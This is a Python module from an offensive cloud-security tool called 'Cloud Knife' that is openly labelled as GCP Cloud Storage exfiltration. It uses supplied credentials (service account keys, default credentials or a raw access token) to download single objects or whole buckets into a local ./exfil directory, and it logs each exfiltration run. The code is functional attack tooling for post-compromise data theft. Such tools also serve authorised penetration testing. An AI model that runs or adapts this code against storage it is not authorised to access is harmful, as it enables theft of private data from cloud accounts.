"""
GCP Cloud Storage Exfiltration for Cloud Knife.

Provides functionality to download objects from Cloud Storage buckets:
- Download single object
- Download all objects from a bucket
- Download objects matching a prefix/pattern

Supports authentication via:
- Service Account JSON key file
- Application Default Credentials (ADC)
- Raw access token (via REST API)
"""

import os
from pathlib import Path
from typing import List, Dict, Any, Optional, TYPE_CHECKING

import requests
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from google.cloud import storage

if TYPE_CHECKING:
    from src.clouds.gcp.gcp_session import GCPSessionManager

console = Console()

# GCS JSON API base URL
GCS_API_BASE = "https://storage.googleapis.com/storage/v1"


def download_object(
    session_mgr: "GCPSessionManager",
    bucket_name: str,
    object_name: str,
    output_path: Optional[str] = None,
) -> Optional[str]:
    """
    Download a single object from a Cloud Storage bucket.

    Uses REST API for access_token auth, client library for service_account/ADC.

    Args:
        session_mgr: GCP session manager with valid credentials
        bucket_name: Name of the bucket
        object_name: Full path/name of the object to download
        output_path: Optional local path to save the file (default: ./exfil/gcp/<bucket>/<object>)

    Returns:
        Local path where the file was saved, or None on failure
    """
    credentials = session_mgr.get_credentials()
    if not credentials:
        console.print("[red]No credentials configured. Use 'set_credentials' first.[/red]")
        return None

    if not bucket_name or not object_name:
        console.print("[red]Bucket name and object name are required.[/red]")
        return None

    # Determine output path
    if not output_path:
        # Create default output directory structure using centralized exfil dir
        exfil_dir = session_mgr.get_exfil_dir("storage")
        base_dir = exfil_dir / bucket_name
        # Preserve object path structure
        output_path = str(base_dir / object_name)

    # Create output directory
    output_dir = Path(output_path).parent
    output_dir.mkdir(parents=True, exist_ok=True)

    auth_method = session_mgr.current_session_data.get("auth_method")

    console.print(f"[dim]Downloading gs://{bucket_name}/{object_name}[/dim]")

    try:
        if auth_method == "access_token":
            # Use REST API for access_token auth
            success = _download_object_rest_api(session_mgr, bucket_name, object_name, output_path)
        else:
            # Use client library for service_account/ADC
            success = _download_object_client_lib(bucket_name, object_name, output_path, credentials)

        if success:
            file_size = os.path.getsize(output_path)
            output_path_abs = str(Path(output_path).resolve())
            console.print(f"[green]Downloaded:[/green] {output_path_abs} ({_format_size(file_size)})")
            return output_path
        else:
            return None

    except Exception as e:
        console.print(f"[red]Error downloading object: {str(e)}[/red]")
        return None


def _download_object_rest_api(
    session_mgr: "GCPSessionManager",
    bucket_name: str,
    object_name: str,
    output_path: str,
) -> bool:
    """Download object using REST API (for access_token auth)."""
    token = session_mgr.current_session_data.get("access_token")
    if not token:
        return False

    headers = {"Authorization": f"Bearer {token}"}

    # URL encode the object name for the API call
    import urllib.parse
    encoded_name = urllib.parse.quote(object_name, safe="")

    # Download object media
    url = f"{GCS_API_BASE}/b/{bucket_name}/o/{encoded_name}?alt=media"

    try:
        response = requests.get(url, headers=headers, stream=True, timeout=300)

        if response.status_code == 404:
            console.print(f"[red]Object '{object_name}' not found in bucket '{bucket_name}'.[/red]")
            return False
        elif response.status_code == 403:
            console.print(f"[red]Access denied to object '{object_name}'.[/red]")
            return False
        elif response.status_code != 200:
            console.print(f"[red]Error downloading object: HTTP {response.status_code}[/red]")
            return False

        # Write to file
        with open(output_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)

        return True

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Request error: {str(e)}[/red]")
        return False


def _download_object_client_lib(
    bucket_name: str,
    object_name: str,
    output_path: str,
    credentials,
) -> bool:
    """Download object using client library (for service_account/ADC)."""
    storage_client = storage.Client(credentials=credentials)

    try:
        bucket = storage_client.bucket(bucket_name)
        blob = bucket.blob(object_name)
        blob.download_to_filename(output_path)
        return True

    except Exception as e:
        error_msg = str(e).lower()
        if "not found" in error_msg or "404" in error_msg:
            console.print(f"[red]Object '{object_name}' not found in bucket '{bucket_name}'.[/red]")
        elif "forbidden" in error_msg or "403" in error_msg:
            console.print(f"[red]Access denied to object '{object_name}'.[/red]")
        else:
            console.print(f"[red]Error: {str(e)}[/red]")
        return False


def download_all_objects(
    session_mgr: "GCPSessionManager",
    bucket_name: str,
    prefix: Optional[str] = None,
    output_dir: Optional[str] = None,
    max_objects: int = 1000,
    max_size_mb: int = 100,
) -> Dict[str, Any]:
    """
    Download all objects from a Cloud Storage bucket.

    Uses REST API for access_token auth, client library for service_account/ADC.

    Args:
        session_mgr: GCP session manager with valid credentials
        bucket_name: Name of the bucket
        prefix: Optional prefix to filter objects (like a folder path)
        output_dir: Optional base directory for downloads (default: ./exfil/gcp/<bucket>/)
        max_objects: Maximum number of objects to download (default: 1000)
        max_size_mb: Maximum total download size in MB (default: 100MB)

    Returns:
        Dictionary with download statistics
    """
    credentials = session_mgr.get_credentials()
    if not credentials:
        console.print("[red]No credentials configured. Use 'set_credentials' first.[/red]")
        return {"success": False, "error": "No credentials"}

    if not bucket_name:
        console.print("[red]Bucket name is required.[/red]")
        return {"success": False, "error": "Bucket name required"}

    # Determine output directory
    if not output_dir:
        output_dir = str(Path("./exfil/gcp") / bucket_name)

    Path(output_dir).mkdir(parents=True, exist_ok=True)

    auth_method = session_mgr.current_session_data.get("auth_method")

    console.print(f"[bold]Exfiltrating bucket: gs://{bucket_name}[/bold]")
    if prefix:
        console.print(f"[dim]Prefix filter: {prefix}[/dim]")
    console.print(f"[dim]Output directory: {output_dir}[/dim]")
    console.print(f"[dim]Limits: max {max_objects} objects, max {max_size_mb}MB total[/dim]")

    # First, enumerate objects
    console.print("\n[dim]Listing objects...[/dim]")

    try:
        if auth_method == "access_token":
            objects = _list_objects_for_download_rest_api(session_mgr, bucket_name, prefix, max_objects)
        else:
            objects = _list_objects_for_download_client_lib(bucket_name, prefix, max_objects, credentials)
    except Exception as e:
        console.print(f"[red]Error listing objects: {str(e)}[/red]")
        return {"success": False, "error": str(e)}

    if not objects:
        console.print("[yellow]No objects found to download.[/yellow]")
        return {"success": True, "downloaded": 0, "failed": 0, "skipped": 0}

    console.print(f"[dim]Found {len(objects)} objects[/dim]")

    # Calculate total size and filter by max_size_mb
    max_size_bytes = max_size_mb * 1024 * 1024
    cumulative_size = 0
    objects_to_download = []

    for obj in objects:
        obj_size = obj.get("size", 0)
        if cumulative_size + obj_size <= max_size_bytes:
            objects_to_download.append(obj)
            cumulative_size += obj_size
        else:
            break

    if len(objects_to_download) < len(objects):
        skipped_count = len(objects) - len(objects_to_download)
        console.print(f"[yellow]Skipping {skipped_count} objects due to size limit ({max_size_mb}MB)[/yellow]")

    total_size_str = _format_size(cumulative_size)
    console.print(f"\n[bold]Downloading {len(objects_to_download)} objects ({total_size_str})...[/bold]\n")

    # Download objects with progress
    downloaded = 0
    failed = 0
    failed_objects = []

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("Downloading...", total=len(objects_to_download))

        for obj in objects_to_download:
            obj_name = obj["name"]

            # Skip "folder" objects (names ending with /)
            if obj_name.endswith("/"):
                progress.advance(task)
                continue

            # Determine local path (preserve directory structure)
            local_path = str(Path(output_dir) / obj_name)
            local_dir = Path(local_path).parent
            local_dir.mkdir(parents=True, exist_ok=True)

            try:
                if auth_method == "access_token":
                    success = _download_object_rest_api(session_mgr, bucket_name, obj_name, local_path)
                else:
                    success = _download_object_client_lib(bucket_name, obj_name, local_path, credentials)

                if success:
                    downloaded += 1
                else:
                    failed += 1
                    failed_objects.append(obj_name)

            except Exception as e:
                failed += 1
                failed_objects.append(obj_name)

            progress.advance(task)

    # Summary
    skipped = len(objects) - len(objects_to_download)

    console.print(f"\n[bold green]Download complete![/bold green]")
    console.print(f"  [green]Downloaded:[/green] {downloaded}")
    console.print(f"  [red]Failed:[/red] {failed}")
    console.print(f"  [yellow]Skipped (size limit):[/yellow] {skipped}")
    console.print(f"  [dim]Output directory:[/dim] {output_dir}")

    if failed_objects:
        console.print(f"\n[red]Failed objects ({len(failed_objects)}):[/red]")
        for obj_name in failed_objects[:10]:
            console.print(f"  - {obj_name}")
        if len(failed_objects) > 10:
            console.print(f"  [dim]... and {len(failed_objects) - 10} more[/dim]")

    result = {
        "success": True,
        "bucket": bucket_name,
        "output_dir": output_dir,
        "downloaded": downloaded,
        "failed": failed,
        "skipped": skipped,
        "total_size": cumulative_size,
        "failed_objects": failed_objects,
    }

    # Save exfiltration record
    session_mgr.save_enumeration_data(f"exfil_bucket_{bucket_name}", result)

    return result


def _list_objects_for_download_rest_api(
    session_mgr: "GCPSessionManager",
    bucket_name: str,
    prefix: Optional[str],
    max_objects: int,
) -> List[Dict[str, Any]]:
    """List objects for download using REST API."""
    token = session_mgr.current_session_data.get("access_token")
    if not token:
        return []

    headers = {"Authorization": f"Bearer {token}"}
    objects: List[Dict[str, Any]] = []
    page_token = None

    while len(objects) < max_objects:
        url = f"{GCS_API_BASE}/b/{bucket_name}/o"
        params = {"maxResults": min(1000, max_objects - len(objects))}

        if prefix:
            params["prefix"] = prefix
        if page_token:
            params["pageToken"] = page_token

        response = requests.get(url, headers=headers, params=params, timeout=30)

        if response.status_code != 200:
            break

        data = response.json()
        items = data.get("items", [])

        for item in items:
            objects.append({
                "name": item.get("name"),
                "size": int(item.get("size", 0)),
            })

        page_token = data.get("nextPageToken")
        if not page_token:
            break

    return objects


def _list_objects_for_download_client_lib(
    bucket_name: str,
    prefix: Optional[str],
    max_objects: int,
    credentials,
) -> List[Dict[str, Any]]:
    """List objects for download using client library."""
    storage_client = storage.Client(credentials=credentials)
    bucket = storage_client.bucket(bucket_name)
    blobs = bucket.list_blobs(prefix=prefix, max_results=max_objects)

    objects = []
    for blob in blobs:
        objects.append({
            "name": blob.name,
            "size": blob.size or 0,
        })

    return objects


def _format_size(size_bytes: int) -> str:
    """Format size in bytes to human-readable format."""
    if size_bytes == 0:
        return "0 B"

    units = ["B", "KB", "MB", "GB", "TB"]
    unit_index = 0
    size = float(size_bytes)

    while size >= 1024 and unit_index < len(units) - 1:
        size /= 1024
        unit_index += 1

    if unit_index == 0:
        return f"{int(size)} B"
    return f"{size:.1f} {units[unit_index]}"
